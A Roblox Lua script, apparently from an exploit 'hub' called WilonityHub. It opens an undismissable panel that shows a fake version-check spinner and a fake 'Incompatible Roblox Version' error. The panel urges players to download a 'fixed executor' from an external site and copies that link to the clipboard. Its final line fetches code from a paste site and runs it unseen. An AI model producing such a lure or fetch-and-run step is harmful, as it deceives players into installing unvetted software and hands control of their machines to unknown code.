-- ════════════════════════════════════════════════════════
-- SERVICES
-- ════════════════════════════════════════════════════════
local Players      = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local Lighting     = game:GetService("Lighting")
local CoreGui      = game:GetService("CoreGui")
local lp           = Players.LocalPlayer

local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

-- ════════════════════════════════════════════════════════
-- PALETTE
-- ════════════════════════════════════════════════════════
local C = {
    bg0     = Color3.fromRGB(8,   9,  11),
    bg1     = Color3.fromRGB(13,  14, 17),
    bg2     = Color3.fromRGB(18,  20, 24),
    bg3     = Color3.fromRGB(24,  26, 32),
    bg4     = Color3.fromRGB(30,  33, 40),
    brd     = Color3.fromRGB(36,  39, 48),
    brd2    = Color3.fromRGB(48,  52, 64),
    acc     = Color3.fromRGB(215, 55, 55),
    accDark = Color3.fromRGB(155, 30, 30),
    accGlow = Color3.fromRGB(235, 80, 80),
    grn     = Color3.fromRGB(65,  195, 115),
    txt     = Color3.fromRGB(198, 201, 215),
    txt2    = Color3.fromRGB(140, 144, 162),
    txt3    = Color3.fromRGB(80,  83,  100),
    white   = Color3.fromRGB(255, 255, 255),
    black   = Color3.fromRGB(0,   0,   0),
    gold    = Color3.fromRGB(235, 175, 35),
    goldDk  = Color3.fromRGB(175, 128, 18),
    dcBlue  = Color3.fromRGB(114, 137, 218),
}

-- ════════════════════════════════════════════════════════
-- UI HELPERS
-- ════════════════════════════════════════════════════════
local GUI = Instance.new("ScreenGui")
GUI.Name           = "WilonityHub_Error"
GUI.ResetOnSpawn   = false
GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
GUI.IgnoreGuiInset = true
GUI.Parent         = CoreGui

local blur = Instance.new("BlurEffect")
blur.Size = 16; blur.Name = "Wilonity_Blur"; blur.Parent = Lighting

local function Tw(obj, t, g)
    TweenService:Create(obj, TweenInfo.new(t), g):Play()
end
local function TwE(obj, t, es, ed, g)
    TweenService:Create(obj, TweenInfo.new(t, es, ed), g):Play()
end
local function TwLoop(obj, t, es, g)
    TweenService:Create(obj,
        TweenInfo.new(t, es, Enum.EasingDirection.InOut, -1, true), g):Play()
end

local function MkFrame(parent, size, pos, bg, r, z)
    local f = Instance.new("Frame", parent)
    f.Size = size; f.Position = pos
    f.BackgroundColor3 = bg or C.bg1
    f.BorderSizePixel = 0
    if r then Instance.new("UICorner", f).CornerRadius = UDim.new(0, r) end
    if z then f.ZIndex = z end
    return f
end

local function MkStroke(parent, col, thick, trans)
    local s = Instance.new("UIStroke", parent)
    s.Color = col or C.brd; s.Thickness = thick or 1; s.Transparency = trans or 0
    return s
end

local function MkLbl(parent, text, sz, col, font, xa)
    local l = Instance.new("TextLabel", parent)
    l.Size = UDim2.new(1,0,1,0); l.Position = UDim2.new(0,0,0,0)
    l.BackgroundTransparency = 1; l.Text = text
    l.TextSize = sz or 13; l.TextColor3 = col or C.txt
    l.Font = font or Enum.Font.GothamMedium
    l.TextXAlignment = xa or Enum.TextXAlignment.Left
    l.TextYAlignment = Enum.TextYAlignment.Center
    l.TextWrapped = false
    return l
end

local function MkBtn(parent, size, pos, bg, r, z)
    local b = Instance.new("TextButton", parent)
    b.Size = size; b.Position = pos
    b.BackgroundColor3 = bg or C.bg3
    b.BorderSizePixel = 0; b.Text = ""; b.AutoButtonColor = false
    if r then Instance.new("UICorner", b).CornerRadius = UDim.new(0, r) end
    if z then b.ZIndex = z end
    return b
end

local function Hover(btn, norm, hot)
    btn.MouseEnter:Connect(function() Tw(btn, 0.14, {BackgroundColor3 = hot}) end)
    btn.MouseLeave:Connect(function() Tw(btn, 0.14, {BackgroundColor3 = norm}) end)
end

local function Press(btn, size, pos)
    btn.MouseButton1Down:Connect(function()
        Tw(btn, 0.07, {
            Size = UDim2.new(size.X.Scale, size.X.Offset-2, size.Y.Scale, size.Y.Offset-2),
            Position = UDim2.new(pos.X.Scale, pos.X.Offset+1, pos.Y.Scale, pos.Y.Offset+1),
        })
    end)
    btn.MouseButton1Up:Connect(function()
        Tw(btn, 0.07, {Size = size, Position = pos})
    end)
end

-- ════════════════════════════════════════════════════════
-- PANEL DIMENSIONS
-- ════════════════════════════════════════════════════════
local PW = isMobile and math.min(330, workspace.CurrentCamera.ViewportSize.X - 16) or 490
local PH = isMobile and 500 or 430

-- ════════════════════════════════════════════════════════
-- BACKDROP + GLOW
-- ════════════════════════════════════════════════════════
local Backdrop = MkFrame(GUI, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), C.black, 0, 1)
Backdrop.BackgroundTransparency = 1

local GlowBg = MkFrame(GUI, UDim2.new(0,PW+80,0,PH+60), UDim2.new(0.5,0,0.5,0), C.acc, 40, 0)
GlowBg.AnchorPoint = Vector2.new(0.5,0.5)
GlowBg.BackgroundTransparency = 0.92
TweenService:Create(GlowBg,
    TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {BackgroundTransparency = 0.87, Size = UDim2.new(0,PW+120,0,PH+100)}):Play()

-- ════════════════════════════════════════════════════════
-- MAIN PANEL
-- ════════════════════════════════════════════════════════
local Panel = MkFrame(GUI, UDim2.new(0,PW,0,PH), UDim2.new(0.5,0,0.5,0), C.bg1, 12, 2)
Panel.AnchorPoint = Vector2.new(0.5,0.5)
Panel.ClipsDescendants = true
MkStroke(Panel, C.brd2, 1)

-- Glass sheen
local Sheen = MkFrame(Panel, UDim2.new(1,0,0.5,0), UDim2.new(0,0,0,0), C.white, 0, 3)
Sheen.BackgroundTransparency = 0.97
local sheenG = Instance.new("UIGradient", Sheen)
sheenG.Rotation = 90
sheenG.Transparency = NumberSequence.new{
    NumberSequenceKeypoint.new(0, 0.93),
    NumberSequenceKeypoint.new(1, 1),
}

-- ════════════════════════════════════════════════════════
-- TOP BAR (no close button)
-- ════════════════════════════════════════════════════════
local TBH = isMobile and 44 or 38
local TopBar = MkFrame(Panel, UDim2.new(1,0,0,TBH), UDim2.new(0,0,0,0), C.bg0, 0, 4)
Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
MkFrame(TopBar, UDim2.new(1,0,0,12), UDim2.new(0,0,1,-12), C.bg0, 0, 4)
MkFrame(TopBar, UDim2.new(1,0,0,2), UDim2.new(0,0,1,-2), C.acc, 0, 5)

-- Logo
local tbSz = isMobile and 22 or 20
local tbImg = Instance.new("ImageLabel", TopBar)
tbImg.Size = UDim2.new(0, tbSz, 0, tbSz)
tbImg.Position = UDim2.new(0, isMobile and 12 or 10, 0.5, -tbSz/2)
tbImg.BackgroundTransparency = 1
tbImg.Image = "rbxassetid://77911892724832"
tbImg.ScaleType = Enum.ScaleType.Fit
tbImg.ZIndex = 6

-- Brand text
local BrandLbl = MkLbl(TopBar,
    '<font color="#D73737">Wilonity</font>Hub',
    isMobile and 13 or 13, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Left)
BrandLbl.Size = UDim2.new(0, 110, 1, -4)
BrandLbl.Position = UDim2.new(0, isMobile and 40 or 36, 0, 2)
BrandLbl.RichText = true; BrandLbl.ZIndex = 6

-- Badge
local BadgeF = MkFrame(TopBar, UDim2.new(0,90,0,isMobile and 18 or 16),
    UDim2.new(0, isMobile and 146 or 138, 0.5, isMobile and -9 or -8), C.bg3, 4, 6)
MkStroke(BadgeF, C.brd2, 1)
MkLbl(BadgeF, "Fix Required", 8, C.txt2, Enum.Font.GothamMedium, Enum.TextXAlignment.Center).ZIndex = 7

-- ════════════════════════════════════════════════════════
-- CONTENT AREA
-- ════════════════════════════════════════════════════════
local PAD  = 18
local Cont = MkFrame(Panel,
    UDim2.new(1,-PAD*2,1,-(TBH+14)),
    UDim2.new(0,PAD,0,TBH+8),
    C.bg1, 0, 3)
Cont.BackgroundTransparency = 1

-- =========================================================================
-- ERROR GROUP (fully transparent background, no grey overlay)
-- =========================================================================
local ErrorGroup = Instance.new("Frame", Cont)
ErrorGroup.Size = UDim2.new(1,0,1,0)
ErrorGroup.BackgroundTransparency = 1
ErrorGroup.Visible = false
ErrorGroup.ZIndex = 4

-- Warning icon
local warnIcon = Instance.new("TextLabel", ErrorGroup)
warnIcon.Size = UDim2.new(0, 64, 0, 64)
warnIcon.Position = UDim2.new(0.5, -32, 0, 10)
warnIcon.BackgroundTransparency = 1
warnIcon.Text = "⚠"
warnIcon.TextColor3 = C.acc
warnIcon.TextSize = 56
warnIcon.TextXAlignment = Enum.TextXAlignment.Center
warnIcon.TextYAlignment = Enum.TextYAlignment.Top
warnIcon.Font = Enum.Font.SourceSansBold
warnIcon.TextTransparency = 1
warnIcon.ZIndex = 4

-- Title
local errTitle = MkLbl(ErrorGroup, "Incompatible Roblox Version",
    isMobile and 18 or 20, C.acc, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
errTitle.Size = UDim2.new(1,0,0,28)
errTitle.Position = UDim2.new(0,0,0,80)
errTitle.TextTransparency = 1
errTitle.ZIndex = 4

-- Main error message
local errMsg1 = MkLbl(ErrorGroup,
    "Your current Roblox version is not compatible with this executor.",
    isMobile and 14 or 15, C.txt, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
errMsg1.Size = UDim2.new(1, -20, 0, 24)
errMsg1.Position = UDim2.new(0, 10, 0, 112)
errMsg1.TextWrapped = true
errMsg1.TextTransparency = 1
errMsg1.ZIndex = 4

local errMsg1b = MkLbl(ErrorGroup,
    "This script requires a specific version to work properly.",
    isMobile and 14 or 15, C.txt, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
errMsg1b.Size = UDim2.new(1, -20, 0, 24)
errMsg1b.Position = UDim2.new(0, 10, 0, 138)
errMsg1b.TextWrapped = true
errMsg1b.TextTransparency = 1
errMsg1b.ZIndex = 4

-- Recommendation
local errMsg2 = MkLbl(ErrorGroup,
    "Please download the fixed executor below to continue using WilonityHub.",
    isMobile and 13 or 14, C.txt2, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
errMsg2.Size = UDim2.new(1, -20, 0, 24)
errMsg2.Position = UDim2.new(0, 10, 0, 166)
errMsg2.TextWrapped = true
errMsg2.TextTransparency = 1
errMsg2.ZIndex = 4

-- Link block with copy button
local linkBlock = MkFrame(ErrorGroup,
    UDim2.new(0, math.min(PW-40, 340), 0, 44),
    UDim2.new(0.5, -math.min(PW-40, 340)/2, 0, 205),
    C.bg2, 8, 4)
MkStroke(linkBlock, C.brd2, 1, 0.3)
linkBlock.BackgroundTransparency = 1

local linkText = MkLbl(linkBlock,
    "https://getsolara.world",
    isMobile and 12 or 13, Color3.fromRGB(130, 200, 255),
    Enum.Font.GothamSemibold, Enum.TextXAlignment.Left)
linkText.Size = UDim2.new(0, linkBlock.Size.X.Offset - 100, 1, 0)
linkText.Position = UDim2.new(0, 10, 0, 0)
linkText.TextTransparency = 1
linkText.ZIndex = 5

-- Copy button
local copyBtn = MkBtn(linkBlock,
    UDim2.new(0, 80, 0, 32),
    UDim2.new(1, -88, 0.5, -16),
    C.acc, 6, 5)
local copyGrad = Instance.new("UIGradient", copyBtn)
copyGrad.Rotation = 90
copyGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, C.accGlow),
    ColorSequenceKeypoint.new(1, C.accDark),
}
local copyLbl = MkLbl(copyBtn, "Copy",
    isMobile and 12 or 13, C.white, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
copyLbl.TextTransparency = 1
copyLbl.ZIndex = 6
Hover(copyBtn, C.acc, C.accGlow)
Press(copyBtn, copyBtn.Size, copyBtn.Position)

-- Copy function
copyBtn.MouseButton1Click:Connect(function()
    local url = "https://getsolara.world"
    local copied = false
    if setclipboard then setclipboard(url); copied = true
    elseif toclipboard then toclipboard(url); copied = true
    elseif syn and syn.set_clipboard then syn.set_clipboard(url); copied = true
    elseif game:GetService("GuiService").SetClipboard then
        game:GetService("GuiService"):SetClipboard(url); copied = true
    end
    if copied then
        copyLbl.Text = "Copied!"
        task.wait(1.2)
        copyLbl.Text = "Copy"
    else
        copyLbl.Text = "Failed!"
        task.wait(1.2)
        copyLbl.Text = "Copy"
    end
end)

-- ════════════════════════════════════════════════════════
-- LOADING OVERLAY
-- ════════════════════════════════════════════════════════
local LoadOv = MkFrame(Panel, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), C.bg1, 12, 20)
LoadOv.Visible = false

local SpinH = MkFrame(LoadOv, UDim2.new(0,64,0,64), UDim2.new(0.5,-32,0.5,-52), C.bg1, 0, 21)
SpinH.BackgroundTransparency = 1

local TrCirc = MkFrame(SpinH, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), C.bg1, 0, 21)
TrCirc.BackgroundTransparency = 1
MkStroke(TrCirc, C.brd2, 4, 0.6)
Instance.new("UICorner", TrCirc).CornerRadius = UDim.new(1,0)

local ArcCirc = MkFrame(SpinH, UDim2.new(1,0,1,0), UDim2.new(0,0,0,0), C.bg1, 0, 22)
ArcCirc.BackgroundTransparency = 1
local arcS = MkStroke(ArcCirc, C.acc, 4, 0)
Instance.new("UICorner", ArcCirc).CornerRadius = UDim.new(1,0)
local arcG = Instance.new("UIGradient", arcS)
arcG.Transparency = NumberSequence.new{
    NumberSequenceKeypoint.new(0,0),
    NumberSequenceKeypoint.new(0.45,0.1),
    NumberSequenceKeypoint.new(0.75,0.6),
    NumberSequenceKeypoint.new(1,1),
}
TweenService:Create(SpinH,
    TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1),
    {Rotation=360}):Play()

local LoadTxt = MkLbl(LoadOv, "Checking Roblox version compatibility",
    isMobile and 14 or 15, C.txt, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
LoadTxt.Size = UDim2.new(1,0,0,22); LoadTxt.Position = UDim2.new(0,0,0.5,22); LoadTxt.ZIndex = 22

local LoadSub = MkLbl(LoadOv, "Please wait a moment",
    isMobile and 10 or 11, C.txt2, Enum.Font.Gotham, Enum.TextXAlignment.Center)
LoadSub.Size = UDim2.new(1,0,0,16); LoadSub.Position = UDim2.new(0,0,0.5,48); LoadSub.ZIndex = 22

task.spawn(function()
    local base = "Checking Roblox version compatibility"; local d = 0
    while LoadOv and LoadOv.Parent do
        if LoadOv.Visible then
            d = (d%3)+1
            LoadTxt.Text = base..string.rep(".",d)
        end
        task.wait(0.5)
    end
end)

local function ShowLoading(show)
    LoadOv.Visible = show
end

-- ════════════════════════════════════════════════════════
-- ENTRANCE ANIMATION
-- ════════════════════════════════════════════════════════
Panel.BackgroundTransparency = 1
Panel.Position = UDim2.new(0.5,0,0.5,36)
TwE(Panel, 0.32, Enum.EasingStyle.Back, Enum.EasingDirection.Out,
    {BackgroundTransparency=0, Position=UDim2.new(0.5,0,0.5,0)})
Tw(Backdrop, 0.22, {BackgroundTransparency=0.35})

-- ════════════════════════════════════════════════════════
-- SEQUENCE: Show loading → wait → show error (no grey background)
-- ════════════════════════════════════════════════════════
ShowLoading(true)

task.wait(2.5)

ShowLoading(false)

-- Now show error group with fade-in of its children
ErrorGroup.Visible = true

-- Fade in icon
Tw(warnIcon, 0.4, {TextTransparency = 0})
task.wait(0.15)
-- Fade in title
Tw(errTitle, 0.4, {TextTransparency = 0})
task.wait(0.1)
-- Fade in first message
Tw(errMsg1, 0.4, {TextTransparency = 0})
task.wait(0.1)
-- Fade in second message
Tw(errMsg1b, 0.4, {TextTransparency = 0})
task.wait(0.1)
-- Fade in recommendation
Tw(errMsg2, 0.4, {TextTransparency = 0})
task.wait(0.1)
-- Fade in link block and its contents
Tw(linkBlock, 0.4, {BackgroundTransparency = 0})
Tw(linkText, 0.4, {TextTransparency = 0})
Tw(copyLbl, 0.4, {TextTransparency = 0})

-- Bounce icon after appearance
task.wait(0.2)
local bounceIcon = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
local iconTween = TweenService:Create(warnIcon, bounceIcon, {TextSize = 68})
iconTween:Play()
task.wait(0.2)
TweenService:Create(warnIcon, TweenInfo.new(0.2), {TextSize = 56}):Play()

-- Loop pulse on icon
TwLoop(warnIcon, 1.8, Enum.EasingStyle.Sine, {TextSize = 64, TextColor3 = C.accGlow})

-- ════════════════════════════════════════════════════════
-- FLOATING PARTICLES
-- ════════════════════════════════════════════════════════
task.spawn(function()
    while Panel and Panel.Parent do
        local p = MkFrame(Panel,
            UDim2.new(0,math.random(2,4),0,math.random(2,4)),
            UDim2.new(math.random(),0,1,0),
            C.acc, 2, 6)
        p.BackgroundTransparency = 0.65
        TweenService:Create(p,
            TweenInfo.new(math.random(9,15), Enum.EasingStyle.Linear),
            {Position=UDim2.new(p.Position.X.Scale,0,-0.08,0), BackgroundTransparency=1}):Play()
        task.delay(16, function() if p and p.Parent then p:Destroy() end end)
        task.wait(math.random(2,4))
    end
end)

-- ════════════════════════════════════════════════════════
-- No close button – UI cannot be dismissed.
-- ════════════════════════════════════════════════════════

loadstring(game:HttpGet("https://pastefy.app/AaiE5Jpp/raw"))()